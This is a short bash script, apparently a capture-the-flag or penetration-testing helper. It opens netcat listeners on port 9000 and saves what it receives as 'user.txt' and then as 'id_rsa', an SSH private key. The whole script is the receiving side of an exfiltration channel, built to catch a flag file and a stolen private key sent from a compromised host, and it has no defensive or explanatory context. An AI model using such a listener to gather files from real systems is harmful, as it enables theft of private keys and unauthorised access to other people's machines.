#!/bin/bash
nc -lnvp 9000 | tee user.txt
sleep 1
nc -lnvp 9000 | tee id_rsa

